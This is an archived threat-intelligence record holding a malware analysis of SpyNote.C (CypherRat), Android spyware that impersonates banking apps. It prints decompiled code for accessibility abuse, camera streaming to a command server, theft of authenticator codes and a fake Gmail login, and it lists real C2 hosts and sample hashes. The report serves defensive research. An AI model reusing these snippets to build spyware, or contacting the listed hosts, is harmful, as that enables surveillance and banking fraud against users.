{
    "id": "b67100eb-8043-4dc0-9254-da14f60973a4",
    "created_at": "2023-02-02T02:07:49.308151Z",
    "updated_at": "2025-03-27T02:16:25.655879Z",
    "deleted_at": null,
    "sha1_hash": "3a6c3dfc49c3be3a83e5bc21444d97b4c23416c0",
    "title": "2023-01-05 - SpyNote- Spyware with RAT capabilities targeting Financial Institutions",
    "authors": "",
    "file_creation_date": "2023-02-01T07:44:20Z",
    "file_modification_date": "2023-02-01T07:44:20Z",
    "file_size": 2314007,
    "plain_text": "# SpyNote: Spyware with RAT capabilities targeting Financial Institutions\n\n**threatfabric.com/blogs/spynote-rat-targeting-financial-institutions.html**\n\nResearch\n\n05 January 2023\n\n## Uncovering the Latest Developments in SpyNote\n\nAndroid Spyware is one of the most common kinds of malware used by attackers to gain access to personal data and carry out fraud\noperations. Due to its capability to track a user’s location, examine web browsing behavioral patterns, and even steal sensitive information,\nsuch as passwords and credit card numbers, the threat level that Android Spyware poses to banking institutions and banking customers\nalike is comparable to Android Banking malware.\n\n\n-----\n\nSpyware also has the potential to record phone calls, remotely manage the device, intercept SMS messages, and perform other tasks by\nusing legitimate APIs and permissions that are intended to aid people.\n\nIn the last quarter of 2022, ThreatFabric researchers observed a large increase in volume for samples belonging to the SpyNote Malware\nfamily.\nThis family, which is also known as SpyMax, is an unique and effective Spyware designed to secretly observe user activity on an\nAndroid device. The SpyNote malware can monitor, manage, and modify the device’s resources and features along with Remote access\ncapabilities.\n\nThis spyware family has evolved over time, with the adoption of cutting-edge methods and technologies. SpyNote has several distinct\nvariants: the most recent one, SpyNote.C, is routinely traced and tracked in day-to-day operations, and makes up for the majority of\nspyware samples ThreatFabric observed from October 2022.\n\nOne of the main differences between the first variants, SpyNote.A and SpyNote.B, and the latest one, SpyNote.C, is the campaign\nobjective. SpyNote.C has been the first variant to openly target banking applications, impersonating a large number of reputable financial\ninstitutions like HSBC, Deutsche Bank, Kotak Bank, BurlaNubank, as well as others to well-known applications like WhatsApp, Facebook,\nand Google Play.\n\nIn addition, we also observed that the attackers utilize more generic application masquerades, such as wallpaper apps, productivity apps, or\ngaming apps.\n\nThreatFabric researchers have identified that some of the SpyNote.C classified apps are being developed by lone actors and promoted as\n**CypherRat. In this article we will discuss how developments on this actor’s project, which is advertised as both spyware and banking**\nmalware, are likely behind the surge in numbers that we observed in the last few months.\n\nOther SpyNote.C campaigns were discovered while analyzing this Spyware family, impersonating System Notifications, Google Play Store.\nThese campaigns ran together with the previously mentioned ones, with the one shown below sharing the same hosts used as C2.\n\n\n-----\n\n## SpyNote Alias CypherRat\n\nThe latest variant of this malware family, SpyNote.C, was further developed and sold to individual actors via Telegram channel by its\ndeveloper, under the name CypherRat.\n\nThe threat actor offered CypherRat for sale utilizing the Sellix payment system, which uses Cryptocurrencies to prevent tracking. These\nsales ran from August 2021 until October 2022, accumulating more than 80 separate customers.\n\nIn October 2022, the source code was made available as open-source via GitHub, after a leak and a few scamming incidents in hacking\nforums, where actors would impersonate the original threat actor to steal money from other criminals.\n\n\n-----\n\nFollowing the release of the source code, the number of samples counts have increase significantly, as we can observe in the statistical\nview using our ThreatFabric Intelligence data.\n\nAs you can see, the numbers are following a clear upward trend, which allowed ThreatFabric to collect more than 1100\n**SpyNote/CypherRat samples from October 2022; this number equals the amount of samples that we saw from the first test version of this**\nvariant collected in 2020.\n\nDuring the course of our investigation, we discovered that the original creator had switched his focus to a new spyware project, CraxsRat,\nas a paid application with similar capabilities as the original project.\n\n## Outstanding Capabilities means Exceptional Abilities\n\n\n-----\n\nWe were interested in the unique spyware skills that the SpyNote.C malware variant can do, which were identified in malicious financial\napps with RAT capabilities around 2022. We have highlighted a few of these features, which can be used to exfiltrate and utilize PII from\n**online banking customers.**\n\nUsing the privileges requested in the screenshot below, This SpyNote variant can be used to track SMS messages, calls, videos, and audio\nrecordings in addition to updating its version and even installing new applications.\n\nThe most recent versions of SpyNote are not only extremely powerful, but they also include a variety of security features, from simple string\nobfuscation to the use of commercial packers. This makes it much more difficult to analyze, making it a potent tool for threat actors.\n\nBelow is a list of some of the SpyNote’s standout features:\n\n\n-----\n\nAbility to use the Camera API to record and send videos from the device s camera to the Command and Control(C&C) center\nGPS and network location tracking information\nUses Accessibility (A11y) to extract codes from Google Authenticator.\nUses Keylogging powered by Accessibility services, to steal banking credentials.\n\n### Accessibility Service\n\nSpyNote uses Accessibility Services to make it difficult for users to uninstall the application, install new versions, and install other apps.\nWithout any user input, SpyNote can click on the “install” and “update” buttons thanks to accessibility services:\n```\n// click 'install' button via A11y\n\nif(\"android.widget.Button\".equals(accessibilityNodeInfo0.getClassName())) {\n\n  String s = accessibilityNodeInfo0.getText().toString();\n\n  if(!TextUtils.isEmpty(s) && ((\"安装\".equals(s)) || (\"install\".equals(s.toLowerCase())) || (\"done\".equals(s.toLowerCase())) ||\n(\"完成\".equals(s)) || (\"\\u062A\\u062B\\u0628\\u064A\\u062A\".equals(s)) || (\"确定\".equals(s)))) {\n\n    accessibilityNodeInfo0.performAction(16);\n\n    return true;\n\n  }\n\n}\n\n\n```\nThis malicious malware can access a device’s camera and send videos right to its Command-and-Control(C&C) server, which is one of its\nmost dangerous capabilities, and can be used to extract PII from the infected device. This gives the attacker complete control over the\ndevice’s camera, enabling them to spy on the user with it.\n```\ncamera_stream.camera = Camera.open(Integer.valueOf(this.vul[0]).intValue());\n\n...\n\nInetSocketAddress inetSocketAddress0 = new InetSocketAddress(InetAddress.getByName(addr), v);\n\ncamera_stream.socket.connect(inetSocketAddress0, 60000);\n\n...\n\nCamera.Parameters params = camera_stream.camera.getParameters();\n\ncamera_stream.camera.startPreview();\n\n\n### Google Authenticator with A11y\n\n```\nSpyNote leverages Accessibility feature to obtain two-factor authentication (2FA) codes. These codes are used as an additional layer of\nsecurity in order to access an account, and are often required for logging into websites, applications, and other services. By exploiting the\naccessibility features of the Google Authenticator app, SpyNote is able to bypass these security measures and gain access to an account\nwithout the user’s knowledge.\n```\npackagename = \"com.google.android.apps.authenticator2\"\n\nIterator iterator0 = utils.findNodeWithClass(accessibilityEvent0.getSource(), \"android.view.ViewGroup\").iterator();\n\nAccessibilityNodeInfo accessibilityNodeInfo1 = accessibilityNodeInfo0.getChild(v);\n\ns1 = s1 + accessibilityNodeInfo1.getText().toString() + \"-\";\n\narr_s = s1.split(\"-\");\n\n...\n\nshared.log(utils.ssss, \"Google Authenticator<\" + arr_s[v] + \"<\" + arr_s[v + 1].getBytes());\n\n\n```\nSpyNote also has the capacity to function as a social app credential stealer. This is done by deceiving users into entering their private login\ninformation during the login process by launching a webpage with a custom layout that looks a lot like famous services like Gmail and\nFacebook, much like a traditional overlay attack is used to show victims a bogus login page for their banking application.\n\nUpon receiving a command from the attacker, the attacker’s C&C server receives the credentials and information that were acquired from\nthe webpage.\n\n\n-----\n\n```\nsocial_creds.this.setContentView(0x7F070001); // layout:glogin\n\n// set callbacks to handle clicks\n\nsocial_creds.this.findViewById(0x7F050031).setOnClickListener(singimallisten); // id:sinbtn\nsocial_creds.this.findViewById(0x7F050023).setOnClickListener(lrnmor); // id:lrnmor\n\nsocial_creds.this.findViewById(0x7F050016).setOnClickListener(Recovergmal); // id:gmailforgtpass\n\n// callback to extract user and password\n\nthis.singimallisten = new View.OnClickListener() {\n\n  public void onClick(View view0) {\n\n    String usrgmail = (social_creds.this.findViewById(0x7F050043)).getText().toString(); // id:usrgmail\n\n    String passgmal = (social_creds.this.findViewById(0x7F05002C)).getText().toString(); // id:passgmal\n\n    if(usrgmail.length() <= 3) {\n\n      cmd_receiver.showToast(\"Please Check Your Email/Password.\");\n\n      return;\n\n    }\n\n    if(passgmal.length() < 8) {\n\n      cmd_receiver.showToast(\"Password Must At least 8 characters.\");\n\n      return;\n\n    }\n\n    shared.log(ddddd.ssss, \"Gmail<\" + s + \"<\" + s1.getBytes());\n\n    social_creds.this.done = true;\n\n    social_creds.this.finish();\n\n  }\n\n};\n\n```\nThe acquired sensitive information is then transferred to the C&C server hardcoded within the application upon receiving the command from\nthe attacker via Accessibility service, encrypted using Base64 to make it stealthier and difficult to identify the host.\n```\n// Identified host, port and key used for C&C communication\n\nstatic {\n\n    AccessibilityService.key = const.encryp(\"bW1tbTE=\"); // mmmm1\n\n    AccessibilityService.c = \"K\";\n\n    AccessibilityService.d = \"dGV4dA==\"; // text\n\n    AccessibilityService.e = \"ZGV2ZWxvcA==\"; // develop\n\n    AccessibilityService.host = \"YWRuYW5rYXJhMS5kZG5zLm5ldA==\"; // adnankara1.ddns.net\n\n    AccessibilityService.port = \"Nzc3MQ==\"; // 7771\n\n}\n\n\n```\nSimilar code patterns were identified in all SpyNote.C related applications, and the aggregated host, port, and key strings observed from\nthese financial institutions are listed below:\n\n## Other common Capabilities\n\nSpyNote also adopts common features that are observed in other Spyware by abusing legitimate APIs, such as tracking location from the\n[users infected device via “GPS” and “Network” thanks to “LocationManager” provided by Android system. Similarly, by abusing](https://developer.android.com/reference/android/location/LocationManager)\n[MediaProjection to capture screen content.](https://developer.android.com/reference/android/media/projection/MediaProjection)\n\nThese are not necessarily connected to banking fraud, but do offer criminals even more information on the victim.\n\n## Conclusion\n\nAs the landscape of Android Spyware evolves, mobile users are always confronted with new and innovative threats. We predict that\nSpyNote will keep using Accessibility Service to collect essential data from users’ devices and that it will be able to develop towards a\nsuccessful distribution. We also believe that the trend will continue adopting better security measures like obfuscation and packers to help\nsafeguard the program itself.\nIt is very likely that different forks of SpyNote will continue appearing, following the release of it source code.\n\nResearchers at ThreatFabric are constantly keeping an eye on the mobile threat landscape, and by following various actors and\ncampaigns, we are able to recognize and capture malware that specifically targets financial institutions. This development is not as\ncommon within the Android Spyware ecosystem, but is extremely dangerous and shows the potential start of a new trend, which will see a\ngradual disappearance of the distinction between spyware and Banking malware, due to the power that the abuse of Accessibility services\ngives to criminals.\n\nFinancial organizations are welcome to contact us: if you suspect some app be involved in malicious activity, feel free to reach our Mobile\n[Threat Intelligence team which will provide additional details and help with reporting the malicious app if identified: mti@threatfabric.com.](mailto://mti@threatfabric.com)\n\n## Appendix\n\n### SpyNote Samples\n\n\n-----\n\n**App name** **Package name** **SHA-256**\n\n\nHSBC UK\nMobile Banking\n\nDeutsche Bank\nMobile\n\n\ncom.employ.mb 6f606bc5004af2b90b66d6e6e4f29f35a3b4a31dc6974b55434b3c53d70584a4\n\ncom.reporting.efficiency 114fa822d7a96169c9cd48303f7fbd1af94f57cb46fec576d91ccea11bc5d974\n\n\nBurlaNubank com.appser.verapp 34d70ce1e9eeafdc225abbfa84c24454986a47ca7a41431c38ca16e612d3f818\n\nKotak Bank splash.app.main bd172dbb47a95e7abc3ce76118bf6cd3f742d7c932ec8801cd553509f31eca8e\n\n\nBank of\nAmerica\nConfirmation\n\n\nyps.eton.application 2e1c68c3e785679c04d915eb2f960ef5e7ef3294a423e1835aa06e0254812c7a\n\n\nCypherRat com.appser.verapp 4779c469c50d157d2140d39fc9b034c931b5224e886bcb60024687fe4022063e\n\nVirtual SimCard cobi0jbpm.apvy8vjjvpser.verapchvvhbjbjq a2a95cfccb8fbe557f605b8a47dad901d3a25f8cdae7f0beee133f60b924c45a\n\nCurrent Activity com.willme.topactivity bade089b4dfdea057132551deb997ba8a25c4d1ced32f78975239c73241181f4\n\nConversations_ com.appser.verapp bf4e003360cb2024dfaa46a79bf05f667d300f2bcd0765b9a12500201b9519a7\n\n### SpyNote C2s connected to Banking campaigns\n\n**Host** **Port**\n\nbizebiz.myftp.org 6378\n\nadnankara1.ddns.net 7771\n\nsilent911-44688.portmap.io 44688\n\n154.211.96.78 8088\n\n159.203.126.35 22526\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-05 - SpyNote- Spyware with RAT capabilities targeting Financial Institutions.pdf"
    ],
    "report_names": [
        "2023-01-05 - SpyNote- Spyware with RAT capabilities targeting Financial Institutions.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1675303669,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1675237460,
    "ts_modification_date": 1675237460,
    "files": {
        "pdf": "https://archive.orkl.eu/3a6c3dfc49c3be3a83e5bc21444d97b4c23416c0.pdf",
        "text": "https://archive.orkl.eu/3a6c3dfc49c3be3a83e5bc21444d97b4c23416c0.txt",
        "img": "https://archive.orkl.eu/3a6c3dfc49c3be3a83e5bc21444d97b4c23416c0.jpg"
    }
}